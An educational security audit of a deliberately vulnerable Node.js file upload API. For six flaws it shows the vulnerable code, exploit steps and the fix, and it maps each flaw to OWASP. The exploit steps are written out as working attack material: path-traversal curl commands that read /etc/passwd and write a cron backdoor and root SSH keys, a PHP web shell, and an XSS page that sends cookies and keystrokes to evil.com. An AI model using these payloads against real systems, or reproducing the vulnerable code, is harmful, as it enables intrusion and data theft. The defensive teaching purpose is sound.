# Security Analysis: Node.js File Upload API

This document provides a complete security audit of a Node.js file upload API. It walks through
six intentionally introduced vulnerabilities, explains how each can be exploited, demonstrates the
fix with proper secure coding practices, and maps every finding to the relevant OWASP principles.

---

## Table of Contents

1. [Vulnerability Summary](#vulnerability-summary)
2. [Detailed Vulnerability Analysis](#detailed-vulnerability-analysis)
   - [VULN-1: Path Traversal](#vuln-1-path-traversal)
   - [VULN-2: Unrestricted File Type / Size](#vuln-2-unrestricted-file-type--size)
   - [VULN-3: Stored XSS via Static File Serving](#vuln-3-stored-xss-via-static-file-serving)
   - [VULN-4: No Rate Limiting (DoS)](#vuln-4-no-rate-limiting-dos)
   - [VULN-5: Information Disclosure](#vuln-5-information-disclosure)
   - [VULN-6: Verbose Error Handling / Missing Security Headers](#vuln-6-verbose-error-handling--missing-security-headers)
3. [OWASP Top 10 Mapping](#owasp-top-10-mapping)
4. [Production Hardening Summary](#production-hardening-summary)
5. [Security Audit Checklist](#security-audit-checklist)

---

## Vulnerability Summary

| ID     | Vulnerability                          | CVSS Est. | OWASP Category               | Status |
|--------|----------------------------------------|-----------|-------------------------------|--------|
| VULN-1 | Path Traversal (upload & download)     | 9.8       | A01: Broken Access Control    | Fixed  |
| VULN-2 | Unrestricted file type & size          | 8.6       | A04: Insecure Design          | Fixed  |
| VULN-3 | Stored XSS via static file serving     | 8.1       | A03: Injection                | Fixed  |
| VULN-4 | No rate limiting                       | 7.5       | A04: Insecure Design          | Fixed  |
| VULN-5 | Information disclosure in responses    | 5.3       | A01: Broken Access Control    | Fixed  |
| VULN-6 | Verbose errors / missing security hdrs | 5.3       | A05: Security Misconfiguration| Fixed  |

---

## Detailed Vulnerability Analysis

### VULN-1: Path Traversal

**Severity:** Critical (CVSS 9.8)

#### Vulnerable Code

```js
// vulnerable-server.js — Upload storage
filename: (req, file, cb) => {
  cb(null, file.originalname); // User-controlled filename used directly
}

// vulnerable-server.js — Download endpoint
app.get('/download', (req, res) => {
  const filename = req.query.filename;
  const filePath = path.join(__dirname, 'uploads', filename);
  // No validation that filePath stays inside uploads/
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  }
});
```

#### How to Exploit

**Step 1 — Read arbitrary files via the download endpoint:**
```bash
# Read /etc/passwd
curl "http://target:3000/download?filename=../../etc/passwd"

# Read the application's own source code
curl "http://target:3000/download?filename=../vulnerable-server.js"

# Read environment variables (often contain secrets)
curl "http://target:3000/download?filename=../../proc/self/environ"
```

**Step 2 — Write files to arbitrary locations via upload:**
```bash
# Write a cron job (Linux privilege escalation)
curl -X POST http://target:3000/upload \
  -F "file=@malicious-cron;filename=../../etc/cron.d/backdoor"

# Overwrite SSH authorized_keys for root access
curl -X POST http://target:3000/upload \
  -F "file=@my-pubkey;filename=../../root/.ssh/authorized_keys"

# On a server running nginx, inject a server config
curl -X POST http://target:3000/upload \
  -F "file=@evil.conf;filename=../../etc/nginx/conf.d/evil.conf"
```

**Step 3 — Confirm the traversal worked:**
```bash
# The server helpfully returns the stored path (VULN-5)
# Response: {"storedPath": "../../etc/cron.d/backdoor"}
```

#### The Fix

```js
// secure-server.js — Random filename generation
filename: (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();
  if (!ALLOWED_EXTENSIONS.has(ext)) {
    return cb(new Error(`Extension "${ext}" not allowed`));
  }
  const randomName = crypto.randomBytes(32).toString('hex');
  cb(null, `${randomName}${ext}`);
}

// secure-server.js — Safe download with path containment
app.get('/download/:filename', (req, res) => {
  const sanitized = sanitizeFilename(req.params.filename);
  if (!sanitized) return res.status(400).json({ error: 'Invalid filename' });

  const filePath = path.resolve(UPLOAD_DIR, sanitized);
  if (!filePath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  // ...
});
```

**Why this works:**
- `crypto.randomBytes(32)` produces 256 bits of entropy — unguessable filenames
- `path.resolve()` canonicalizes the path (resolves `..` segments)
- The `startsWith()` check ensures the resolved path is still inside `UPLOAD_DIR`
- `sanitizeFilename()` strips directory components and rejects special characters

---

### VULN-2: Unrestricted File Type / Size

**Severity:** High (CVSS 8.6)

#### Vulnerable Code

```js
// vulnerable-server.js — No fileFilter, no size limit
const upload = multer({ storage });
```

#### How to Exploit

**Step 1 — Upload a web shell (if a PHP/JSP engine is co-hosted):**
```bash
# Upload a PHP reverse shell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -X POST http://target:3000/upload -F "file=@shell.php"
# Access: http://target:3000/uploads/shell.php?cmd=id
```

**Step 2 — Upload a massive file to exhaust disk space (DoS):**
```bash
# Generate a 10 GB file of zeros
dd if=/dev/zero of=huge.bin bs=1M count=10240
curl -X POST http://target:3000/upload -F "file=@huge.bin"
# Repeat until disk is full
```

**Step 3 — Upload a polyglot file (bypasses extension-only checks):**
```bash
# A file that is simultaneously a valid JPEG and contains PHP code
# The JPEG header passes image checks, but the PHP engine parses the embedded code
curl -X POST http://target:3000/upload -F "file=@polyglot.jpg.php"
```

#### The Fix

```js
// secure-server.js — Allowlist of MIME types + extensions + size limit
const upload = multer({
  storage,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5 MB max
    files: 1,                    // Single file per request
    fields: 5,                   // Limit form fields
  },
  fileFilter: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (!ALLOWED_MIME_TYPES.has(file.mimetype)) {
      return cb(new Error(`MIME type "${file.mimetype}" not allowed`));
    }
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      return cb(new Error(`Extension "${ext}" not allowed`));
    }
    cb(null, true);
  },
});
```

**Additionally — Magic bytes validation (defense in depth):**
```js
// After upload, verify the file's actual content matches its extension
const isValidContent = await validateMagicBytes(req.file.path, ext);
if (!isValidContent) {
  await fs.promises.unlink(req.file.path);  // Delete the fake file
  return res.status(400).json({ error: 'Content does not match extension' });
}
```

**Why this works:**
- Triple validation: extension allowlist + MIME type allowlist + magic bytes
- Size limit prevents disk exhaustion
- Magic bytes check defeats polyglot attacks
- If any check fails, the file is rejected (and cleaned up if already written)

---

### VULN-3: Stored XSS via Static File Serving

**Severity:** High (CVSS 8.1)

#### Vulnerable Code

```js
// vulnerable-server.js — Serves uploads directly as web content
app.use('/uploads', express.static('uploads'));
```

#### How to Exploit

**Step 1 — Upload an HTML file containing malicious JavaScript:**
```bash
cat > evil.html << 'EOF'
<html>
<body>
<h1>Innocent Page</h1>
<script>
  // Steal cookies and send to attacker's server
  fetch('https://evil.com/steal?cookie=' + document.cookie);

  // Or: keylogger
  document.addEventListener('keydown', e => {
    fetch('https://evil.com/keys?k=' + e.key);
  });
</script>
</body>
</html>
EOF
curl -X POST http://target:3000/upload -F "file=@evil.html"
```

**Step 2 — Send the link to a victim:**
```
Hey, check out this document: http://target:3000/uploads/evil.html
```

**Step 3 — When the victim visits the URL, the browser executes the JavaScript
in the context of the target domain.** The attacker can:
- Steal session cookies
- Perform actions on behalf of the victim
- Redirect to phishing pages
- Install a keylogger

**Step 4 — SVG variant (often overlooked):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
```
Upload as `image.svg` — browsers render SVGs with full JS execution.

#### The Fix

```js
// secure-server.js — No static serving of uploads
// Instead, downloads are served through a controlled endpoint:
app.get('/download/:filename', (req, res) => {
  // ... path validation ...
  res.setHeader('Content-Disposition', `attachment; filename="${sanitized}"`);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.sendFile(filePath);
});
```

**Why this works:**
- `Content-Disposition: attachment` forces the browser to download, never render
- `X-Content-Type-Options: nosniff` prevents MIME type sniffing
- HTML/SVG files are never served as `text/html` — they download as raw files
- No `express.static()` means the uploads directory is never browseable

---

### VULN-4: No Rate Limiting (DoS)

**Severity:** High (CVSS 7.5)

#### Vulnerable Code

```js
// vulnerable-server.js — No rate limiting anywhere
app.post('/upload', upload.single('file'), (req, res) => { /* ... */ });
```

#### How to Exploit

**Step 1 — Disk exhaustion attack:**
```bash
# Upload thousands of files in parallel
for i in $(seq 1 10000); do
  dd if=/dev/urandom of=/tmp/file_$i.dat bs=100M count=1 2>/dev/null
  curl -s -X POST http://target:3000/upload -F "file=@/tmp/file_$i.dat" &
done
wait
```

**Step 2 — CPU/memory exhaustion via concurrent requests:**
```bash
# Using a benchmarking tool
ab -n 100000 -c 500 -p payload.txt -T "multipart/form-data" \
  http://target:3000/upload
```

**Step 3 — Filename enumeration on the download endpoint:**
```bash
# Brute-force filenames to discover uploaded files
for name in $(cat wordlist.txt); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://target:3000/download?filename=$name")
  if [ "$response" = "200" ]; then
    echo "Found: $name"
  fi
done
```

#### The Fix

```js
// secure-server.js — Layered rate limiting
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                    // 100 requests per window per IP
});
app.use(globalLimiter);

const uploadLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,                     // Only 20 uploads per 15 minutes
});
app.post('/upload', uploadLimiter, /* ... */);
```

**Why this works:**
- Two tiers: global (100 req/15min) + upload-specific (20 req/15min)
- `express-rate-limit` tracks by IP address using an in-memory store
- Returns HTTP 429 with a clear message when the limit is hit
- Standard `RateLimit-*` headers inform clients of their remaining quota
- In production, use a Redis-backed store for distributed rate limiting

---

### VULN-5: Information Disclosure

**Severity:** Medium (CVSS 5.3)

#### Vulnerable Code

```js
// vulnerable-server.js — Response leaks internal details
res.json({
  message: 'File uploaded successfully',
  file: {
    originalName: req.file.originalname,
    storedPath: req.file.path,         // "uploads/../../etc/cron.d/backdoor"
    destination: req.file.destination,  // "uploads/"
    size: req.file.size,
    mimetype: req.file.mimetype,
  },
});
```

#### How to Exploit

**Step 1 — Map the server's filesystem structure:**
```bash
curl -X POST http://target:3000/upload -F "file=@test.txt" | jq
# Response reveals:
# {
#   "file": {
#     "storedPath": "/home/app/project/uploads/test.txt",
#     "destination": "/home/app/project/uploads/"
#   }
# }
```

From this single response, the attacker learns:
- The application runs from `/home/app/project/`
- The OS is Linux (forward slashes)
- The username is likely `app`
- The upload directory structure

**Step 2 — Use this info to craft targeted path traversal payloads:**
```bash
# Now that we know the path depth, craft a precise traversal
curl "http://target:3000/download?filename=../../../../etc/shadow"
```

**Step 3 — Use MIME type echoing to confirm server behavior:**
```bash
# The server echoes back whatever MIME type the client sends
# This confirms the server trusts client-supplied Content-Type
curl -X POST http://target:3000/upload \
  -F "file=@shell.php;type=image/jpeg"
# Response: { "mimetype": "image/jpeg" } — confirms type spoofing works
```

#### The Fix

```js
// secure-server.js — Minimal response
res.status(201).json({
  message: 'File uploaded successfully',
  file: {
    id: path.basename(req.file.filename, ext),  // Just the random ID
    filename: req.file.filename,                 // Random name, no path info
    size: req.file.size,
  },
});
```

**Why this works:**
- No server paths, directory structures, or internal names leaked
- The filename is randomly generated — reveals nothing about server internals
- Only the minimum information needed for the client to reference the file

---

### VULN-6: Verbose Error Handling / Missing Security Headers

**Severity:** Medium (CVSS 5.3)

#### Vulnerable Code

```js
// vulnerable-server.js — Full stack traces + system info sent to client
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    details: {
      nodeVersion: process.version,
      platform: process.platform,
      cwd: process.cwd(),
    },
  });
});
```

#### How to Exploit

**Step 1 — Trigger an error to fingerprint the stack:**
```bash
# Send a malformed multipart request
curl -X POST http://target:3000/upload \
  -H "Content-Type: multipart/form-data; boundary=INVALID"
# Response includes:
# {
#   "stack": "MulterError: ... at /home/app/project/node_modules/multer/...",
#   "details": {
#     "nodeVersion": "v20.11.0",
#     "platform": "linux",
#     "cwd": "/home/app/project"
#   }
# }
```

**Step 2 — Use the disclosed info to find known CVEs:**
```
Node v20.11.0 → search for CVEs affecting this version
Multer version visible in stack trace → check for known vulnerabilities
Path structure → confirms Linux, helps craft OS-specific payloads
```

**Step 3 — Missing security headers enable further attacks:**
```bash
# No X-Frame-Options → clickjacking
# No Content-Security-Policy → XSS amplification
# No Strict-Transport-Security → MITM downgrade attacks
# X-Powered-By: Express → framework fingerprinting
```

#### The Fix

```js
// secure-server.js — helmet for headers + safe error handler
app.use(helmet());
app.disable('x-powered-by');

app.use((err, req, res, next) => {
  console.error(`[${new Date().toISOString()}] Error:`, err.message);
  if (process.env.NODE_ENV !== 'production') {
    console.error(err.stack);  // Logs only, never sent to client
  }
  res.status(500).json({ error: 'An internal error occurred' });
});
```

**Why this works:**
- `helmet()` sets 15+ security headers automatically
- `x-powered-by` is disabled — no framework fingerprinting
- Stack traces go to server logs, never to the client
- Error messages are generic — no internal details exposed
- In production, stack traces are suppressed even from logs

---

## OWASP Top 10 Mapping

### A01:2021 — Broken Access Control

**Relevance:** VULN-1 (path traversal) and VULN-5 (information disclosure) directly violate access control. The server fails to enforce boundaries on which files users can read/write.

**Principle applied:** Deny by default. The secure version resolves paths and validates they remain within the designated upload directory. Filenames are generated server-side, removing user influence over storage locations.

### A02:2021 — Cryptographic Failures

**Relevance:** If uploaded files contain sensitive data, the lack of encryption at rest is a concern. The secure version uses `crypto.randomBytes()` for filename generation, ensuring unpredictability.

**Principle applied:** Use strong, well-vetted cryptographic functions. Avoid `Math.random()` or timestamp-based naming for any security-relevant identifier.

### A03:2021 — Injection

**Relevance:** VULN-3 (stored XSS) is a form of injection where an attacker injects JavaScript into a file that the server later serves to other users' browsers.

**Principle applied:** Never render user-uploaded content as HTML. Force downloads with `Content-Disposition: attachment`. Validate that file content matches its declared type (magic bytes).

### A04:2021 — Insecure Design

**Relevance:** VULN-2 (no file type restrictions) and VULN-4 (no rate limiting) are design-level failures. The original system was designed without considering file upload as a threat vector.

**Principle applied:** Threat-model file uploads during design. Apply defense in depth: extension allowlist + MIME type allowlist + magic bytes + size limits + rate limits.

### A05:2021 — Security Misconfiguration

**Relevance:** VULN-6 (verbose errors, missing security headers) is a textbook misconfiguration. Default Express settings expose framework identity and lack critical security headers.

**Principle applied:** Apply minimal-privilege, minimal-information defaults. Use `helmet()` to set security headers. Never expose stack traces or system details to clients.

### A06:2021 — Vulnerable and Outdated Components

**Relevance:** Always keep `multer`, `express`, and all dependencies up to date. Use `npm audit` regularly and pin dependency versions.

**Principle applied:** Maintain a software bill of materials. Automate dependency scanning with tools like `npm audit`, Snyk, or Dependabot.

### A07:2021 — Identification and Authentication Failures

**Relevance:** The API has no authentication. In production, file uploads should require authentication (JWT, session tokens, API keys) so uploads are attributable and access is controlled.

**Principle applied:** Implement authentication before authorization. Use multi-factor authentication for sensitive operations.

### A08:2021 — Software and Data Integrity Failures

**Relevance:** Without magic bytes validation, the server trusts the client's MIME type header — a form of data integrity failure. A polyglot file can bypass extension-only checks.

**Principle applied:** Validate data integrity server-side. Never trust client-supplied metadata alone. Verify file content independently of declared type.

### A09:2021 — Security Logging and Monitoring Failures

**Relevance:** The vulnerable version has no logging. Attacks leave no trace. The secure version logs errors server-side with timestamps, enabling incident detection and forensics.

**Principle applied:** Log security-relevant events (uploads, errors, rate limit triggers). Use structured logging. Forward logs to a SIEM in production.

### A10:2021 — Server-Side Request Forgery (SSRF)

**Relevance:** If the API accepted URLs instead of file uploads (e.g., "fetch file from URL"), SSRF would be a risk. Our API only accepts direct uploads, but this should be considered if the design evolves.

**Principle applied:** If you add URL-based fetching, validate and allowlist target hosts. Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, 127.0.0.1).

---

## Production Hardening Summary

The secure version (`secure-server.js`) applies the following hardening measures:

| Category            | Measure                                               |
|---------------------|-------------------------------------------------------|
| **Input validation**| Extension allowlist, MIME type allowlist, magic bytes  |
| **Sanitization**    | `sanitizeFilename()` strips traversal, special chars  |
| **File naming**     | `crypto.randomBytes(32)` — 256-bit random filenames   |
| **Path safety**     | `path.resolve()` + `startsWith()` containment check   |
| **Size limits**     | 5 MB max file size, 1 file per request                |
| **Rate limiting**   | 100 req/15min global, 20 uploads/15min per IP         |
| **Security headers**| `helmet()` — CSP, HSTS, X-Frame-Options, nosniff, etc|
| **Error handling**  | Generic errors to client, detailed logs server-side   |
| **No static serve** | Uploads served via controlled endpoint only           |
| **Binding**         | Server binds to `127.0.0.1`, not `0.0.0.0`           |
| **Directory perms** | Upload dir created with mode `0o750`                  |

---

## Security Audit Checklist

Use this checklist for future security audits of file upload systems.

### Input Validation
- [ ] File extensions are validated against a strict allowlist
- [ ] MIME types are validated against a strict allowlist
- [ ] File content is verified via magic bytes / file signatures
- [ ] File size is limited (both per-file and total storage)
- [ ] Number of files per request is limited
- [ ] Filenames are sanitized or replaced with server-generated names
- [ ] Form field count is limited to prevent HTTP parameter pollution

### Path Security
- [ ] User-supplied filenames are NEVER used in file system paths
- [ ] Downloaded file paths are validated to stay within the upload directory
- [ ] `path.resolve()` is used to canonicalize paths before comparison
- [ ] Null bytes (`%00`) in filenames are rejected
- [ ] Double extensions (e.g., `file.php.jpg`) are handled correctly

### Access Control
- [ ] Upload endpoints require authentication
- [ ] File access is authorized per user (users can't access others' files)
- [ ] Upload directory is NOT served via `express.static()`
- [ ] Downloaded files use `Content-Disposition: attachment`
- [ ] `X-Content-Type-Options: nosniff` is set on all responses

### Rate Limiting & DoS Prevention
- [ ] Global rate limiting is enforced
- [ ] Upload-specific rate limiting is enforced (stricter)
- [ ] File size limits are enforced at the middleware level
- [ ] Concurrent upload limits are in place
- [ ] Disk space monitoring / quotas are configured

### Security Headers
- [ ] `helmet()` or equivalent is configured
- [ ] `X-Powered-By` header is removed
- [ ] `Content-Security-Policy` restricts script sources
- [ ] `Strict-Transport-Security` enforces HTTPS
- [ ] `X-Frame-Options` prevents clickjacking
- [ ] CORS is configured restrictively (not `*`)

### Error Handling & Logging
- [ ] Stack traces are NEVER sent to clients
- [ ] Error messages are generic and non-informative
- [ ] Node.js version and platform details are not disclosed
- [ ] All upload attempts (success and failure) are logged
- [ ] Rate limit triggers are logged
- [ ] Logs include timestamps, client IP, and request metadata
- [ ] Logs are forwarded to a centralized logging system

### Infrastructure
- [ ] Upload directory has restrictive permissions (e.g., `750`)
- [ ] Server binds to `127.0.0.1` behind a reverse proxy, not `0.0.0.0`
- [ ] TLS/HTTPS is terminated at the reverse proxy
- [ ] File system is monitored for unusual growth
- [ ] Uploaded files are scanned by antivirus/malware detection
- [ ] Dependencies are audited regularly (`npm audit`)
- [ ] A `Content-Security-Policy` prevents inline script execution

### Advanced (Production)
- [ ] Files are stored outside the web root (e.g., S3, GCS)
- [ ] Files are served via signed, time-limited URLs
- [ ] Image files are re-encoded (strips embedded scripts from EXIF)
- [ ] A virus scanner runs on uploaded files before they are stored
- [ ] Upload metadata is stored in a database, not in the filesystem
- [ ] File deletion / expiration policies are enforced
- [ ] Penetration testing is performed regularly

---

## Running the Servers

### Vulnerable Version (for educational testing only)

```bash
cd secure-file-upload-api
node vulnerable-server.js
# Runs on http://localhost:3000
```

### Secure Version

```bash
cd secure-file-upload-api
node secure-server.js
# Runs on http://127.0.0.1:3001
```

### Testing Upload

```bash
# Upload a file to the secure server
curl -X POST http://127.0.0.1:3001/upload -F "file=@photo.jpg"

# Download a file
curl http://127.0.0.1:3001/download/abc123def456.jpg --output photo.jpg

# List files
curl http://127.0.0.1:3001/files
```

---

## References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Helmet.js Documentation](https://helmetjs.github.io/)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
